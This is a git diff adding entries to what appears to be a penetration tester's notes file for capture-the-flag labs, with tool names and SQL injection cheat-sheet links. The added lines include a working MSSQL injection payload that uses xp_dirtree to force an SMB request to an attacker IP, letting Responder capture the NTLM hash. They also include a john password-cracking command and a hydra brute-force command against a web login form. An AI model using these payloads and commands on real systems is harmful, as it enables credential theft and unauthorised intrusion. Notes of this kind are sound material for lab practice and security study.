@@ -1,2 +1,15 @@
 #Useful links
 https://www.hashes.org
+
+
+
+WEB
+davtest
+droopescan --> https://github.com/droope/droopescan
+http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/
+# make smb request to steal hash +++ listen with responder -I tun0
+27;declare @q varchar(200);set @q='\\10.10.14.7\foo'; exec master.dbo.xp_dirtree @q; --
+john stacy.hash --wordlist=/usr/share/wordlists/rockyou.txt
+hydra internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password" -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt
+
